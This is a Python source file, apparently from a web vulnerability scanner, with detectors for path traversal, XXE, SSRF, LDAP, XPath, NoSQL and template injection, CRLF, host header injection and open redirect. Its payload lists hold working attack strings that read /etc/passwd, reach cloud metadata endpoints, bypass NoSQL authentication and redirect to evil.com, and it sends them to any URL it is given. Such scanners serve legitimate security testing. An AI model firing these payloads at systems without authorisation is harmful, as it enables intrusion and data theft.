"""
Additional Vulnerability Detectors
50+ more vulnerability detection patterns
"""

import requests
import re
import time
import json
import base64
from urllib.parse import urlparse, quote, unquote
import hashlib
import jwt
import ssl
import socket

class AdditionalVulnerabilityDetectors:
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Scanner v3.0)'
        })
    
    # ============================================================================
    # Path Traversal / LFI / RFI
    # ============================================================================
    
    def detect_path_traversal(self, url, param_name, param_value):
        """Detect path traversal vulnerabilities"""
        vulnerabilities = []
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..;/..;/..;/etc/passwd',
            '..//..//..//etc/passwd',
            '..\\..\\..\\.\\windows\\win.ini',
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            '/var/www/../../etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        ]
        
        for payload in traversal_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={quote(payload)}")
                response = self.session.get(test_url, timeout=5, verify=False)
                
                if self._detect_lfi_success(response.text):
                    vulnerabilities.append({
                        'type': 'Path Traversal',
                        'subtype': 'Local File Inclusion',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 95,
                        'severity': 'high',
                        'cwe': 'CWE-22',
                        'owasp': 'A01:2021',
                        'evidence': 'Successfully accessed system file',
                        'remediation': 'Use allowlists for file access, avoid user input in file paths'
                    })
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _detect_lfi_success(self, html):
        """Detect successful LFI"""
        indicators = [
            'root:x:', 'root:*:', 'daemon:', 'bin:',  # /etc/passwd
            '[fonts]', '[extensions]', 'for 16-bit app support',  # win.ini
            '<?php', '<?=',  # PHP source
            'import ', 'def ', 'class ',  # Python source
        ]
        
        for indicator in indicators:
            if indicator in html:
                return True
        return False
    
    # ============================================================================
    # XXE Injection
    # ============================================================================
    
    def detect_xxe_injection(self, url, param_name=None, param_value=None):
        """Detect XML External Entity injection"""
        vulnerabilities = []
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
        
        for payload in xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(url, data=payload, headers=headers, timeout=5, verify=False)
                
                if 'root:' in response.text or 'ami-id' in response.text:
                    vulnerabilities.append({
                        'type': 'XXE Injection',
                        'url': url,
                        'payload': payload[:100] + '...',
                        'confidence': 90,
                        'severity': 'high',
                        'cwe': 'CWE-611',
                        'owasp': 'A05:2021',
                        'evidence': 'External entity processed',
                        'remediation': 'Disable external entity processing in XML parsers'
                    })
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    # ============================================================================
    # SSRF Detection
    # ============================================================================
    
    def detect_ssrf(self, url, param_name, param_value):
        """Detect Server-Side Request Forgery"""
        vulnerabilities = []
        
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/',
            'http://127.0.0.1:80',
            'http://localhost:8080',
            'file:///etc/passwd',
            'gopher://127.0.0.1:80',
            'dict://127.0.0.1:11211',
        ]
        
        for payload in ssrf_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={quote(payload)}")
                
                start = time.time()
                response = self.session.get(test_url, timeout=5, verify=False)
                elapsed = time.time() - start
                
                # Check for metadata endpoints
                if 'ami-id' in response.text or 'instance-id' in response.text:
                    vulnerabilities.append({
                        'type': 'SSRF',
                        'subtype': 'Cloud Metadata Access',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 95,
                        'severity': 'critical',
                        'cwe': 'CWE-918',
                        'owasp': 'A10:2021',
                        'evidence': 'Cloud metadata endpoint accessible',
                        'remediation': 'Implement URL allowlisting and disable unnecessary protocols'
                    })
                    break
                
                # Time-based detection
                if elapsed > 3:
                    vulnerabilities.append({
                        'type': 'SSRF',
                        'subtype': 'Blind',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 70,
                        'severity': 'high',
                        'cwe': 'CWE-918',
                        'evidence': f'Delayed response ({elapsed:.2f}s)',
                        'remediation': 'Validate and sanitize URLs, use allowlists'
                    })
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    # ============================================================================
    # LDAP Injection
    # ============================================================================
    
    def detect_ldap_injection(self, url, param_name, param_value):
        """Detect LDAP injection vulnerabilities"""
        vulnerabilities = []
        
        ldap_payloads = [
            '*',
            '*)(&',
            '*)(uid=*',
            '*)(|(uid=*',
            'admin*',
            'admin*)((|userPassword=*)',
            '*)(objectClass=*',
            '*)(objectClass=*))(&(objectClass=*',
        ]
        
        for payload in ldap_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={quote(payload)}")
                response = self.session.get(test_url, timeout=5, verify=False)
                
                if self._detect_ldap_error(response.text):
                    vulnerabilities.append({
                        'type': 'LDAP Injection',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 85,
                        'severity': 'high',
                        'cwe': 'CWE-90',
                        'owasp': 'A03:2021',
                        'evidence': 'LDAP error detected',
                        'remediation': 'Escape special LDAP characters, use parameterized queries'
                    })
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _detect_ldap_error(self, html):
        """Detect LDAP errors"""
        errors = [
            'LDAP', 'ldap_', 'javax.naming.', 'LDAPException',
            'com.sun.jndi.ldap', 'Search filter error',
            'ObjectNotFoundException', 'NamingException',
            'Directory Service', 'invalid DN syntax'
        ]
        
        html_lower = html.lower()
        for error in errors:
            if error.lower() in html_lower:
                return True
        return False
    
    # ============================================================================
    # XPath Injection
    # ============================================================================
    
    def detect_xpath_injection(self, url, param_name, param_value):
        """Detect XPath injection vulnerabilities"""
        vulnerabilities = []
        
        xpath_payloads = [
            "' or '1'='1",
            "' or '1'='1' or '",
            "1' or '1' = '1",
            "'] | //* | //*[' ",
            "' or count(/)=1 or '",
            "' or boolean(1) or '",
            "' and '1'='2",
        ]
        
        for payload in xpath_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={quote(payload)}")
                response = self.session.get(test_url, timeout=5, verify=False)
                
                if self._detect_xpath_error(response.text):
                    vulnerabilities.append({
                        'type': 'XPath Injection',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 85,
                        'severity': 'high',
                        'cwe': 'CWE-643',
                        'owasp': 'A03:2021',
                        'evidence': 'XPath error detected',
                        'remediation': 'Use parameterized XPath queries'
                    })
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _detect_xpath_error(self, html):
        """Detect XPath errors"""
        errors = [
            'XPathException', 'XPath error', 'javax.xml.xpath',
            'invalid xpath', 'xpath syntax', 'DOMXPath',
            'SimpleXMLElement', 'xmlXPathEval'
        ]
        
        for error in errors:
            if error in html:
                return True
        return False
    
    # ============================================================================
    # NoSQL Injection
    # ============================================================================
    
    def detect_nosql_injection(self, url, param_name, param_value):
        """Detect NoSQL injection vulnerabilities"""
        vulnerabilities = []
        
        nosql_payloads = [
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '[$ne]=1',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$where": "1==1"}',
            "'; return true; var dummy='",
            '{"$or": [{"a": "a"}, {"a": "b"}]}',
        ]
        
        for payload in nosql_payloads:
            try:
                # Try as parameter value
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={quote(payload)}")
                response = self.session.get(test_url, timeout=5, verify=False)
                
                # Try as JSON body
                headers = {'Content-Type': 'application/json'}
                response2 = self.session.post(url, data=payload, headers=headers, timeout=5, verify=False)
                
                if self._detect_nosql_success(response.text) or self._detect_nosql_success(response2.text):
                    vulnerabilities.append({
                        'type': 'NoSQL Injection',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 80,
                        'severity': 'high',
                        'cwe': 'CWE-943',
                        'owasp': 'A03:2021',
                        'evidence': 'NoSQL injection successful',
                        'remediation': 'Validate and sanitize input, use proper query builders'
                    })
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _detect_nosql_success(self, html):
        """Detect successful NoSQL injection"""
        # Look for authentication bypass or data exposure
        if len(html) > 1000 and ('admin' in html.lower() or 'user' in html.lower()):
            return True
        
        # Look for MongoDB errors
        errors = ['MongoError', 'MongoDB', 'mongoose', 'collection.', 'document.']
        for error in errors:
            if error in html:
                return True
        
        return False
    
    # ============================================================================
    # Template Injection
    # ============================================================================
    
    def detect_template_injection(self, url, param_name, param_value):
        """Detect Server-Side Template Injection"""
        vulnerabilities = []
        
        template_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '*{7*7}',
            '{{config}}',
            '{{self}}',
            '{{_self.env}}',
            '{{settings}}',
            '${class.getClassLoader()}',
            '{{constructor.constructor("alert(1)")()}}',
        ]
        
        for payload in template_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={quote(payload)}")
                response = self.session.get(test_url, timeout=5, verify=False)
                
                # Check for template execution
                if '49' in response.text:  # 7*7=49
                    vulnerabilities.append({
                        'type': 'Template Injection',
                        'subtype': 'SSTI',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 90,
                        'severity': 'critical',
                        'cwe': 'CWE-1336',
                        'owasp': 'A03:2021',
                        'evidence': 'Template expression evaluated',
                        'remediation': 'Use sandboxed template engines, validate input'
                    })
                    break
                
                # Check for config/env exposure
                if 'config' in response.text or 'SECRET' in response.text or 'PASSWORD' in response.text:
                    vulnerabilities.append({
                        'type': 'Template Injection',
                        'subtype': 'Information Disclosure',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 85,
                        'severity': 'high',
                        'evidence': 'Configuration exposed',
                        'remediation': 'Restrict template access to sensitive objects'
                    })
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    # ============================================================================
    # CRLF Injection
    # ============================================================================
    
    def detect_crlf_injection(self, url, param_name, param_value):
        """Detect CRLF injection vulnerabilities"""
        vulnerabilities = []
        
        crlf_payloads = [
            '%0d%0aSet-Cookie:%20test=test',
            '%0aSet-Cookie:%20test=test',
            '%0dSet-Cookie:%20test=test',
            '%0d%0aLocation:%20http://evil.com',
            '\\r\\nSet-Cookie:%20test=test',
            '\\nSet-Cookie:%20test=test',
        ]
        
        for payload in crlf_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={payload}")
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                
                # Check if we injected headers
                if 'test=test' in response.headers.get('Set-Cookie', ''):
                    vulnerabilities.append({
                        'type': 'CRLF Injection',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'confidence': 95,
                        'severity': 'medium',
                        'cwe': 'CWE-93',
                        'owasp': 'A03:2021',
                        'evidence': 'Successfully injected HTTP header',
                        'remediation': 'Validate and sanitize input, remove CR/LF characters'
                    })
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    # ============================================================================
    # Host Header Injection
    # ============================================================================
    
    def detect_host_header_injection(self, url, param_name=None, param_value=None):
        """Detect host header injection vulnerabilities"""
        vulnerabilities = []
        
        test_hosts = [
            'evil.com',
            'evil.com:80',
            'evil.com\\@legitimate.com',
            'evil.com#legitimate.com',
        ]
        
        for test_host in test_hosts:
            try:
                headers = {'Host': test_host}
                response = self.session.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
                
                # Check if host is reflected
                if test_host in response.text or test_host in response.headers.get('Location', ''):
                    vulnerabilities.append({
                        'type': 'Host Header Injection',
                        'url': url,
                        'payload': test_host,
                        'confidence': 85,
                        'severity': 'medium',
                        'cwe': 'CWE-20',
                        'owasp': 'A05:2021',
                        'evidence': 'Host header reflected in response',
                        'remediation': 'Validate Host header against allowlist'
                    })
                    break
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    # ============================================================================
    # Open Redirect
    # ============================================================================
    
    def detect_open_redirect(self, url, param_name, param_value):
        """Detect open redirect vulnerabilities"""
        vulnerabilities = []
        
        redirect_payloads = [
            'http://evil.com',
            'https://evil.com',
            '//evil.com',
            '////evil.com',
            'http:evil.com',
            '\\\\evil.com',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
        ]
        
        for payload in redirect_payloads:
            try:
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={quote(payload)}")
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if 'evil.com' in location or payload in location:
                        vulnerabilities.append({
                            'type': 'Open Redirect',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'confidence': 90,
                            'severity': 'medium',
                            'cwe': 'CWE-601',
                            'owasp': 'A01:2021',
                            'evidence': f'Redirects to: {location}',
                            'remediation': 'Use allowlist for redirect URLs'
                        })
                        break
                        
            except Exception:
                continue
        
        return vulnerabilities
